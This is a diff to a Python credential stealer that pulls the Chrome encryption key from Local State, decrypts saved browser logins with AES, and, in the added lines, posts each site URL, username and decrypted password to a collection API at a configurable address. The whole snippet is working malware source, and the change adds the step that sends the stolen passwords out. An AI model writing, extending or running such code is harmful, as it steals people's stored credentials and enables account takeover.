@@ -1,9 +1,12 @@
 
 import os, json, base64, win32crypt, shutil, sqlite3, threading
 from Crypto.Cipher import AES
+# Import requests to make requests to the API
+import requests
 
 CHROME_PATH_LOCAL_STATE = ""
 CHROME_PATH = ""
+API_URL = "http://127.0.0.1:5000"
 
 def is_hackable():
         global CHROME_PATH_LOCAL_STATE, CHROME_PATH
@@ -82,6 +85,9 @@ def get_and_decrypt_all_passwords():
             ciphertext= login[2]
             
             decrypted_pass = decrypt(ciphertext, secret_key)
+            
+            # Send the data to the api (/add)
+            requests.post(API_URL + "/add", json={ "url": url, "username": username, "email": "", "password": decrypted_pass })
             
             print("Url :", url)
             print("Username : ", username)
